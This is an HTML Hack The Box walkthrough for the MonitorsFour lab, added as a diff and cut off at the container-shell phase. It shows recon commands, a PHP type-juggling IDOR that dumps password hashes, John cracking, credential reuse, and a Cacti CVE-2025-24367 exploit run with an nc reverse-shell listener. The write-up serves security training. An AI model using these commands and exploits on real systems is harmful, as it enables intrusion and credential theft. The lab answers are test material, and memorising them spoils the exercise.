@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MonitorsFour | HTB Lab Complete Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff;
+            --accent-green: #00ff9d;
+            --accent-purple: #b300ff;
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 95%;
+            padding: 4rem 0;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-family: var(--mono-font);
+            font-size: 0.9rem;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .category {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #fff, #00e5ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            color: var(--accent-blue);
+            font-family: var(--mono-font);
+            margin-top: 1rem;
+            font-size: 1.1rem;
+        }
+
+        section {
+            margin-bottom: 5rem;
+            scroll-margin-top: 2rem;
+        }
+
+        .section-num {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            border-bottom: 1px dashed var(--border-color);
+            padding-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 2rem;
+            border-left: 4px solid var(--accent-blue);
+            padding-left: 1rem;
+            margin-bottom: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #fff;
+        }
+
+        h3 {
+            font-size: 1.3rem;
+            color: #fff;
+            margin: 2rem 0 1rem 0;
+            font-family: var(--mono-font);
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.5rem;
+        }
+
+        h4 {
+            font-size: 1.1rem;
+            color: var(--accent-blue);
+            margin: 1.5rem 0 0.5rem 0;
+            font-family: var(--mono-font);
+        }
+
+        p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            margin-bottom: 1rem;
+        }
+
+        strong {
+            color: #fff;
+        }
+
+        code {
+            font-family: var(--mono-font);
+            color: var(--accent-green);
+            background: rgba(0, 255, 157, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.95rem;
+        }
+
+        pre {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            overflow-x: auto;
+            color: var(--accent-green);
+            white-space: pre-wrap;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin: 1.5rem 0;
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin: 2rem 0;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: var(--mono-font);
+            font-size: 0.95rem;
+        }
+
+        th {
+            text-align: left;
+            padding: 1rem;
+            border-bottom: 2px solid var(--border-color);
+            color: #fff;
+            text-transform: uppercase;
+            background: var(--card-bg);
+        }
+
+        td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-dim);
+            vertical-align: top;
+        }
+
+        tr:hover td {
+            color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .flag-box {
+            background: linear-gradient(45deg, #001a1a, #000);
+            border: 1px solid var(--accent-blue);
+            padding: 2rem;
+            text-align: center;
+            border-radius: 8px;
+            margin: 3rem 0;
+        }
+
+        .flag-label {
+            display: block;
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--accent-blue);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .flag-text {
+            font-family: var(--mono-font);
+            font-size: 2rem;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+        }
+
+        .tip-box {
+            background: var(--card-bg);
+            border: 1px solid var(--accent-blue);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+        
+        .tip-box strong {
+            color: var(--accent-blue);
+            font-size: 1.1rem;
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        .warning-box {
+            background: rgba(255, 100, 100, 0.1);
+            border: 1px solid #ff6464;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+        
+        .warning-box strong {
+            color: #ff6464;
+            font-size: 1.1rem;
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .command-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1rem;
+            border-radius: 8px;
+        }
+
+        .command-card code {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            color: var(--accent-purple);
+        }
+
+        .command-desc {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+        }
+
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin: 2rem 0;
+            gap: 0.5rem;
+        }
+
+        .chain-node {
+            background: var(--card-bg);
+            border: 1px solid var(--accent-blue);
+            padding: 1rem;
+            border-radius: 8px;
+            flex: 1;
+            min-width: 120px;
+            text-align: center;
+            font-family: var(--mono-font);
+            font-size: 0.9rem;
+            position: relative;
+        }
+
+        .chain-node::after {
+            content: "→";
+            position: absolute;
+            right: -15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--accent-blue);
+            font-size: 1.2rem;
+        }
+
+        .chain-node:last-child::after {
+            content: "";
+        }
+
+        .chain-node.completed {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .vulnerability-badge {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .architecture-diagram {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .arch-line {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 1rem 0;
+            color: var(--text-dim);
+        }
+
+        .arch-arrow {
+            color: var(--accent-blue);
+            font-size: 1.5rem;
+        }
+
+        .tool-comparison {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .tool-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+        }
+
+        .tool-card h4 {
+            margin-top: 0;
+            color: var(--accent-blue);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .two-column, .tool-comparison {
+                grid-template-columns: 1fr;
+            }
+            
+            .attack-chain {
+                flex-direction: column;
+            }
+            
+            .chain-node::after {
+                content: "↓";
+                right: 50%;
+                top: auto;
+                bottom: -20px;
+                transform: translateX(50%);
+            }
+        }
+
+        .toc {
+            background: var(--card-bg);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            border: 1px solid var(--border-color);
+        }
+
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 0.5rem;
+        }
+
+        .toc-item {
+            color: var(--text-dim);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-family: var(--mono-font);
+            padding: 0.3rem;
+        }
+
+        .toc-item:hover {
+            color: var(--accent-blue);
+        }
+
+        .terminal-prompt {
+            color: var(--accent-green);
+            font-weight: bold;
+        }
+
+        .whatweb-breakdown {
+            background: var(--card-bg);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <a href="#" class="back-link">← Back to HTB Labs Index</a>
+    
+    <header>
+        <span class="category">Hack The Box // Windows // Docker Escape // CVE-2025-24367</span>
+        <h1>MonitorsFour: Complete Technical Deep Dive</h1>
+        <div class="subtitle">Target IP: 10.129.10.81 // Domain: monitorsfour.htb // cacti.monitorsfour.htb // Last Updated: March 2026</div>
+    </header>
+
+    <div class="toc">
+        <h3 style="margin-top: 0; border-bottom: none; color: var(--accent-blue);">📋 TABLE OF CONTENTS</h3>
+        <div class="toc-grid">
+            <a href="#phase0" class="toc-item">Phase 0: Initial Setup</a>
+            <a href="#phase1" class="toc-item">Phase 1: Reconnaissance</a>
+            <a href="#phase2" class="toc-item">Phase 2: IDOR Discovery</a>
+            <a href="#phase3" class="toc-item">Phase 3: Hash Cracking</a>
+            <a href="#phase4" class="toc-item">Phase 4: Subdomain Enum</a>
+            <a href="#phase5" class="toc-item">Phase 5: Cacti Access</a>
+            <a href="#phase6" class="toc-item">Phase 6: RCE (CVE-2025-24367)</a>
+            <a href="#phase7" class="toc-item">Phase 7: Container Shell</a>
+            <a href="#phase8" class="toc-item">Phase 8: Docker Escape</a>
+            <a href="#phase9" class="toc-item">Phase 9: Flags</a>
+            <a href="#tools" class="toc-item">Tool Usage Guide</a>
+            <a href="#whatweb" class="toc-item">WhatWeb Deep Dive</a>
+            <a href="#curl" class="toc-item">Curl vs Browser</a>
+            <a href="#reference" class="toc-item">Command Reference</a>
+            <a href="#troubleshooting" class="toc-item">Troubleshooting</a>
+        </div>
+    </div>
+
+    <div class="attack-chain">
+        <div class="chain-node completed">IDOR (token=0)</div>
+        <div class="chain-node completed">Hash Cracking</div>
+        <div class="chain-node completed">Cred Reuse</div>
+        <div class="chain-node completed">Cacti RCE</div>
+        <div class="chain-node completed">Container Shell</div>
+        <div class="chain-node completed">Docker Escape</div>
+        <div class="chain-node completed">Windows SYSTEM</div>
+    </div>
+
+    <div class="architecture-diagram">
+        <div style="color: #fff; margin-bottom: 1rem;"><strong>ARCHITECTURE BREAKDOWN</strong></div>
+        <div class="arch-line">
+            <span>Windows 11 Host</span>
+            <span class="arch-arrow">↓</span>
+            <span>WSL2 (Linux VM)</span>
+            <span class="arch-arrow">↓</span>
+            <span>Docker Desktop</span>
+            <span class="arch-arrow">↓</span>
+            <span>Cacti Container</span>
+        </div>
+        <div style="color: var(--accent-blue); margin-top: 1rem; font-size: 0.9rem;">← You are here (Phase 7) →</div>
+    </div>
+
+    <section id="tools">
+        <div class="section-num">/ TOOL USAGE GUIDE</div>
+        <h2>curl vs Browser: When to Use What</h2>
+
+        <div class="tool-comparison">
+            <div class="tool-card">
+                <h4>🖥️ curl (Terminal)</h4>
+                <ul style="color: var(--text-dim);">
+                    <li><strong>Fast testing</strong> - No GUI needed</li>
+                    <li><strong>Raw output</strong> - See exact JSON/HTML</li>
+                    <li><strong>Headers inspection</strong> - <code>curl -I</code></li>
+                    <li><strong>API testing</strong> - POST, PUT, DELETE</li>
+                    <li><strong>Automation</strong> - Scriptable</li>
+                    <li><strong>No caching</strong> - Fresh each time</li>
+                    <li><strong>SSH-friendly</strong> - Works remotely</li>
+                </ul>
+                <pre style="margin: 1rem 0 0 0; font-size: 0.8rem;">
+# Quick check
+curl -I http://site.com
+
+# API test
+curl "http://site.com/api?token=0"
+
+# POST data
+curl -X POST -d "user=admin" http://site.com/login</pre>
+            </div>
+            <div class="tool-card">
+                <h4>🌐 Browser (Firefox/Chrome)</h4>
+                <ul style="color: var(--text-dim);">
+                    <li><strong>Visual rendering</strong> - See pages as designed</li>
+                    <li><strong>Form interaction</strong> - Click buttons, fill forms</li>
+                    <li><strong>Developer Tools (F12)</strong>:
+                        <ul>
+                            <li>Network tab - Watch XHR requests</li>
+                            <li>Console - JavaScript errors</li>
+                            <li>Elements - Inspect HTML</li>
+                            <li>Storage - View cookies</li>
+                        </ul>
+                    </li>
+                    <li><strong>Session management</strong> - Automatic cookies</li>
+                    <li><strong>JavaScript execution</strong> - See dynamic content</li>
+                </ul>
+                <pre style="margin: 1rem 0 0 0; font-size: 0.8rem;">
+# Open site
+firefox http://monitorsfour.htb
+
+# DevTools shortcut
+F12 → Network tab → Reload</pre>
+            </div>
+        </div>
+
+        <h3>📊 MonitorsFour Tool Usage</h3>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Phase</th>
+                        <th>Tool</th>
+                        <th>Why</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>Initial check</td><td><code>curl -I</code></td><td>Fast server verification</td></tr>
+                    <tr><td>Directory fuzzing</td><td><code>ffuf</code></td><td>Automated discovery</td></tr>
+                    <tr><td>IDOR testing</td><td><code>curl</code></td><td>Quick parameter tests</td></tr>
+                    <tr><td>View login page</td><td>Browser</td><td>See form structure</td></tr>
+                    <tr><td>Cacti interface</td><td>Browser</td><td>Navigate menus, click buttons</td></tr>
+                    <tr><td>API discovery</td><td><code>curl</code></td><td>Test endpoints, see JSON</td></tr>
+                    <tr><td>Docker API</td><td><code>curl</code></td><td>No browser in container</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <strong>🎯 Pro Tip</strong>
+            <p>Use both! <code>curl</code> for quick testing and automation, browser for visual exploration and debugging with DevTools. In Phase 6, we used browser to log into Cacti, then <code>curl</code> to exploit the Docker API from the container shell.</p>
+        </div>
+    </section>
+
+    <section id="whatweb">
+        <div class="section-num">/ FINGERPRINTING DEEP DIVE</div>
+        <h2>Understanding WhatWeb Output</h2>
+
+        <div class="whatweb-breakdown">
+            <pre style="margin: 0 0 1rem 0;">whatweb http://monitorsfour.htb
+http://monitorsfour.htb [200 OK] Bootstrap, Cookies[PHPSESSID], 
+Country[RESERVED][ZZ], Email[sales@monitorsfour.htb], HTTPServer[nginx], 
+IP[10.129.10.81], JQuery, PHP[8.3.27], Script, 
+Title[MonitorsFour - Networking Solutions], X-Powered-By[PHP/8.3.27], 
+X-UA-Compatible[IE=edge], nginx</pre>
+        </div>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Finding</th>
+                        <th>What It Means</th>
+                        <th>Why It Matters</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>200 OK</code></td>
+                        <td>Website is up and responding</td>
+                        <td>Confirms target accessibility</td>
+                    </tr>
+                    <tr>
+                        <td><code>PHP/8.3.27</code> (x2)</td>
+                        <td>PHP version 8.3.27 running</td>
+                        <td><strong>Critical:</strong> Type juggling vulnerability exists - explains why token=0 works</td>
+                    </tr>
+                    <tr>
+                        <td><code>nginx</code></td>
+                        <td>Web server is nginx</td>
+                        <td>Common reverse proxy, often with PHP-FPM</td>
+                    </tr>
+                    <tr>
+                        <td><code>Cookies[PHPSESSID]</code></td>
+                        <td>PHP session cookies used</td>
+                        <td>Session management - need to handle cookies in authenticated requests</td>
+                    </tr>
+                    <tr>
+                        <td><code>Title[...]</code></td>
+                        <td>Page title: "MonitorsFour - Networking Solutions"</td>
+                        <td>Confirms correct target, hints at monitoring theme</td>
+                    </tr>
+                    <tr>
+                        <td><code>Bootstrap</code></td>
+                        <td>Uses Bootstrap framework</td>
+                        <td>Frontend framework - indicates modern web design</td>
+                    </tr>
+                    <tr>
+                        <td><code>JQuery</code></td>
+                        <td>jQuery library loaded</td>
+                        <td>JavaScript library, may have AJAX calls we can inspect</td>
+                    </tr>
+                    <tr>
+                        <td><code>Email[sales@...]</code></td>
+                        <td>Email found in page</td>
+                        <td>Potential username for later attacks or password reset enumeration</td>
+                    </tr>
+                    <tr>
+                        <td><code>Country[RESERVED][ZZ]</code></td>
+                        <td>Reserved/unknown location</td>
+                        <td>HTB machines use reserved IP space - normal</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>🎯 Attack Implications</h3>
+        <div class="two-column">
+            <div>
+                <h4>Confirmed Attack Vectors</h4>
+                <ul style="color: var(--text-dim);">
+                    <li><strong>PHP 8.3.27</strong> → Type juggling (token=0 exploit)</li>
+                    <li><strong>PHPSESSID</strong> → Need to maintain sessions</li>
+                    <li><strong>Email</strong> → Possible username for credential reuse</li>
+                </ul>
+            </div>
+            <div>
+                <h4>Technology Stack</h4>
+                <pre style="margin:0;">
+nginx + PHP + Bootstrap + jQuery
+    ↓      ↓        ↓         ↓
+Reverse  Backend  Frontend  JavaScript
+ Proxy   Logic    Framework  Library</pre>
+            </div>
+        </div>
+
+        <div class="tip-box">
+            <strong>🔍 WhatWeb vs Other Tools</strong>
+            <p><strong>WhatWeb</strong> - Passive fingerprinting, no requests to suspicious paths<br>
+            <strong>Wappalyzer</strong> - Browser extension, shows tech stack visually<br>
+            <strong>BuiltWith</strong> - Online tool, more detailed tech profiles<br>
+            <strong>nmap -sV</strong> - Active scanning, can be detected</p>
+            <p>For HTB, WhatWeb is perfect - fast, quiet, and gives us what we need.</p>
+        </div>
+    </section>
+
+    <section id="phase0">
+        <div class="section-num">/ PHASE 0 / INITIAL SETUP</div>
+        <h2>VPN Connection & Environment Prep</h2>
+
+        <h3>0.1 Connect to HTB VPN</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Navigate to Downloads folder
+cd ~/Downloads
+
+<span class="terminal-prompt">#</span> Connect to HTB VPN (replace with your username)
+sudo openvpn your-htb-username.ovpn
+
+<span class="terminal-prompt">#</span> Wait for: Initialization Sequence Completed
+<span class="terminal-prompt">#</span> Open a NEW terminal and verify connection</pre>
+
+        <h3>0.2 Spawn Machine & Verify Connectivity</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Go to MonitorsFour lab page on HTB
+<span class="terminal-prompt">#</span> Click "Spawn Machine" (wait 2-3 minutes)
+<span class="terminal-prompt">#</span> Note the IP address
+
+<span class="terminal-prompt">#</span> Test connectivity
+ping -c 4 10.129.10.81
+<span class="terminal-prompt">#</span> Expected: 0% packet loss, ~30-50ms latency</pre>
+
+        <h3>0.3 Add Domain to Hosts File</h3>
+        <pre>
+<span class="terminal-prompt">#</span> The web server redirects to monitorsfour.htb
+echo "10.129.10.81 monitorsfour.htb" | sudo tee -a /etc/hosts
+
+<span class="terminal-prompt">#</span> Verify it was added
+cat /etc/hosts | grep monitorsfour</pre>
+
+        <div class="tip-box">
+            <strong>🔧 VPN Troubleshooting</strong>
+            <p><strong>Issue:</strong> "No route to host" or 100% packet loss<br>
+            <strong>Fix:</strong> Restart OpenVPN: <code>sudo killall openvpn; sudo openvpn ~/your-username.ovpn</code></p>
+            <p><strong>Issue:</strong> Machine IP changed (like from 10.129.10.15 → 10.129.10.81)<br>
+            <strong>Fix:</strong> Update /etc/hosts with new IP</p>
+        </div>
+    </section>
+
+    <section id="phase1">
+        <div class="section-num">/ PHASE 1 / RECONNAISSANCE</div>
+        <h2>Port Scanning & Directory Enumeration</h2>
+
+        <h3>1.1 Nmap Scan</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Comprehensive scan with default scripts
+nmap -sC -sV -oA monitorsfour 10.129.10.81</pre>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Version</th>
+                        <th>Attack Vector</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>80/tcp</td>
+                        <td>HTTP</td>
+                        <td>nginx</td>
+                        <td>Web application, redirects to monitorsfour.htb</td>
+                    </tr>
+                    <tr>
+                        <td>5985/tcp</td>
+                        <td>WinRM</td>
+                        <td>Microsoft HTTPAPI</td>
+                        <td>Windows Remote Management - eventual access</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>1.2 Technology Fingerprinting with WhatWeb</h3>
+        <pre>
+<span class="terminal-prompt">#</span> whatweb for technology detection
+whatweb http://monitorsfour.htb
+
+<span class="terminal-prompt">#</span> Output highlights:
+<span class="terminal-prompt">#</span> - PHP/8.3.27 (critical for IDOR)
+<span class="terminal-prompt">#</span> - PHPSESSID cookies
+<span class="terminal-prompt">#</span> - nginx server
+<span class="terminal-prompt">#</span> - Email: sales@monitorsfour.htb</pre>
+
+        <h3>1.3 Directory Fuzzing with ffuf</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Install ffuf if needed
+sudo apt update && sudo apt install ffuf -y
+
+<span class="terminal-prompt">#</span> Directory enumeration
+ffuf -u http://monitorsfour.htb/FUZZ \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -c -t 50</pre>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Directory</th>
+                        <th>Status</th>
+                        <th>Size</th>
+                        <th>Notes</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>/login</td><td>200</td><td>3099</td><td>Login page</td></tr>
+                    <tr><td>/user</td><td>200</td><td>35</td><td><strong>Suspiciously small - likely API</strong></td></tr>
+                    <tr><td>/controllers</td><td>301</td><td>162</td><td>MVC structure</td></tr>
+                    <tr><td>/views</td><td>301</td><td>162</td><td>MVC structure</td></tr>
+                    <tr><td>/static</td><td>301</td><td>162</td><td>Static assets</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>1.4 Investigate the /user Endpoint</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Check what /user returns
+curl -v http://monitorsfour.htb/user
+
+<span class="terminal-prompt">#</span> Response: {"error":"Missing token parameter"}</pre>
+
+        <div class="tip-box">
+            <strong>🎯 Key Finding</strong>
+            <p>The <code>/user</code> endpoint with only 35 bytes suggests it's an API returning JSON, not HTML. The error message indicates it requires a token parameter - this is our attack surface.</p>
+        </div>
+    </section>
+
+    <section id="phase2">
+        <div class="section-num">/ PHASE 2 / IDOR VULNERABILITY</div>
+        <h2>Token Bypass & User Data Extraction</h2>
+
+        <h3>2.1 Understanding IDOR</h3>
+        <p><strong>IDOR (Insecure Direct Object Reference)</strong> occurs when an application exposes direct references to internal objects without proper authorization checks. Here, the token parameter is vulnerable to PHP type juggling.</p>
+
+        <h3>2.2 Test Token Values</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Try different token values
+curl "http://monitorsfour.htb/user?token=1"
+curl "http://monitorsfour.htb/user?token=admin"
+curl "http://monitorsfour.htb/user?token=0"   <span class="terminal-prompt"># ← THIS WORKS!</span></pre>
+
+        <h3>2.3 The Magic Response</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Save the output
+curl "http://monitorsfour.htb/user?token=0" | jq . > users.json
+
+<span class="terminal-prompt">#</span> View formatted output
+cat users.json | jq .</pre>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Username</th>
+                        <th>Password Hash (MD5)</th>
+                        <th>Role</th>
+                        <th>Name</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>admin</td><td><code>56b32eb43e6f15395f6c46c1c9e1cd36</code></td><td>super user</td><td>Marcus Higgins</td></tr>
+                    <tr><td>mwatson</td><td><code>69196959c16b26ef00b77d82cf6eb169</code></td><td>user</td><td>Michael Watson</td></tr>
+                    <tr><td>janderson</td><td><code>2a22dcf99190c322d974c8df5ba3256b</code></td><td>user</td><td>Jennifer Anderson</td></tr>
+                    <tr><td>dthompson</td><td><code>8d4a7e7fd08555133e056d9aacb1e519</code></td><td>user</td><td>David Thompson</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>2.4 Why Does token=0 Work?</h3>
+        <p>This is a <strong>PHP type juggling vulnerability</strong> - confirmed by WhatWeb's PHP/8.3.27 detection:</p>
+        <pre>
+<span class="terminal-prompt">//</span> Vulnerable code (loose comparison)
+if ($token == null) {
+    return error("Missing token");
+}
+
+<span class="terminal-prompt">//</span> In PHP, 0 == null is TRUE because 0 is falsy
+<span class="terminal-prompt">//</span> This bypasses the authentication check entirely!</pre>
+
+        <div class="tip-box">
+            <strong>🔒 The Fix</strong>
+            <p>Always use strict comparison (<code>===</code>) in PHP:</p>
+            <pre>if ($token === null) {
+    return error("Missing token");
+}</pre>
+        </div>
+
+        <h3>2.5 Save the Admin Hash</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Save admin hash for cracking
+echo "56b32eb43e6f15395f6c46c1c9e1cd36" > admin_hash.txt
+
+<span class="terminal-prompt">#</span> Verify
+cat admin_hash.txt</pre>
+    </section>
+
+    <section id="phase3">
+        <div class="section-num">/ PHASE 3 / PASSWORD CRACKING</div>
+        <h2>Hash Cracking with John/Hashcat</h2>
+
+        <h3>3.1 Prepare rockyou.txt Wordlist</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Check if rockyou.txt exists
+ls -la /usr/share/wordlists/
+
+<span class="terminal-prompt">#</span> If you see rockyou.txt.gz, decompress it
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz</pre>
+
+        <h3>3.2 Crack with John the Ripper</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Basic john command
+john --format=raw-md5 admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+<span class="terminal-prompt">#</span> Output:
+<span class="terminal-prompt">wonderful1       (?)</span>
+1g 0:00:00:00 DONE</pre>
+
+        <div class="flag-box" style="padding: 1rem;">
+            <span class="flag-label">CRACKED PASSWORD</span>
+            <div class="flag-text" style="font-size: 1.5rem;">wonderful1</div>
+        </div>
+
+        <h3>3.3 Note the Admin's Name</h3>
+        <pre>
+<span class="terminal-prompt">#</span> From the JSON output:
+"name": "Marcus Higgins"
+
+<span class="terminal-prompt">#</span> Possible username variations:
+<span class="terminal-prompt">#</span> - marcus
+<span class="terminal-prompt">#</span> - mhiggins
+<span class="terminal-prompt">#</span> - marcus.higgins</pre>
+    </section>
+
+    <section id="phase4">
+        <div class="section-num">/ PHASE 4 / SUBDOMAIN ENUMERATION</div>
+        <h2>Discovering cacti.monitorsfour.htb</h2>
+
+        <h3>4.1 Create Subdomain Wordlist</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Create a targeted wordlist
+cat > subdomains.txt << 'EOF'
+cacti
+grafana
+prometheus
+nagios
+zabbix
+admin
+portal
+dev
+stage
+api
+app
+mail
+web
+www
+monitor
+dashboard
+EOF</pre>
+
+        <h3>4.2 Fuzz for Subdomains with ffuf</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Host header fuzzing
+ffuf -c -w subdomains.txt \
+     -H "Host: FUZZ.monitorsfour.htb" \
+     -u http://10.129.10.81 \
+     -fs 138</pre>
+
+        <h3>4.3 Result Found: cacti</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Add to hosts file
+echo "10.129.10.81 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
+
+<span class="terminal-prompt">#</span> Verify
+cat /etc/hosts | grep monitorsfour</pre>
+    </section>
+
+    <section id="phase5">
+        <div class="section-num">/ PHASE 5 / CACTI ACCESS</div>
+        <h2>Credential Reuse & Version Detection</h2>
+
+        <h3>5.1 Access Cacti in Browser</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Open Firefox
+firefox http://cacti.monitorsfour.htb</pre>
+
+        <h3>5.2 Login with Reused Credentials</h3>
+        <pre>
+<span class="terminal-prompt">Username:</span> marcus
+<span class="terminal-prompt">Password:</span> wonderful1</pre>
+
+        <h3>5.3 Verify Cacti Version</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Look in the footer of any page
+<span class="terminal-prompt">#</span> Expected: Cacti Version 1.2.28</pre>
+
+        <div class="vulnerability-badge">CVE-2025-24367</div>
+        <div class="vulnerability-badge">CVSS 8.8</div>
+        <div class="vulnerability-badge">Authenticated RCE</div>
+    </section>
+
+    <section id="phase6">
+        <div class="section-num">/ PHASE 6 / RCE EXPLOITATION</div>
+        <h2>CVE-2025-24367: From Login to Shell</h2>
+
+        <h3>6.1 Download the Exploit</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Clone the exploit repository
+git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
+cd CVE-2025-24367-Cacti-PoC
+pip install -r requirements.txt</pre>
+
+        <h3>6.2 Set Up Listener (New Terminal)</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Open a new terminal window
+nc -lvnp 9001</pre>
+
+        <h3>6.3 Run the Exploit</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Find your tun0 IP
+ip a show tun0 | grep inet
+
+<span class="terminal-prompt">#</span> Run the exploit
+sudo python3 exploit.py \
+    -url http://cacti.monitorsfour.htb \
+    -u marcus \
+    -p wonderful1 \
+    -i 10.10.14.130 \
+    -l 9001</pre>
+    </section>
+
+    <section id="phase7">
+        <div class="section-num">/ PHASE 7 / CONTAINER SHELL</div>
+        <h2>Post-Exploitation: We're in a Container!</h2>
+
+        <h3>7.1 Verify the Environment</h3>
+        <pre>
